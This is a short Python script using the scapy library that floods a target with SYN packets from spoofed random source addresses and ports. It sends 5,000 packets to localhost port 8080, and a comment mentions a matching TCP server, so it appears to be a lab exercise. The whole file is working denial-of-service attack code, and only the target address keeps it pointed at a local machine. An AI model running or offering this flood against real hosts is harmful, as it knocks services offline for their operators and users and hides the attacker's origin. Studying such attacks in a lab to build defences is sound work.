from scapy.all import *
import random

# Target IP and Port (same as the server)
TARGET_IP = "127.0.0.1"  # Localhost
TARGET_PORT = 8080        # Must match the TCP Server's port

def syn_flood(target_ip, target_port, packet_count=100):
    """
    Launches a SYN Flood attack by sending crafted SYN packets to the target.
    """
    print(f"[*] Starting SYN Flood attack on {target_ip}:{target_port}")

    for _ in range(packet_count):
        # Generate a random source IP (spoofed)
        src_ip = f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"

        # Generate a random source port
        src_port = random.randint(1024, 65535)

        # Craft the SYN packet
        syn_packet = IP(src=src_ip, dst=target_ip) / TCP(sport=src_port, dport=target_port, flags="S")

        # Send the packet
        send(syn_packet, verbose=False)

    print(f"[+] Sent {packet_count} SYN packets to {target_ip}:{target_port}")

if __name__ == "__main__":
    syn_flood(TARGET_IP, TARGET_PORT, packet_count=5000)

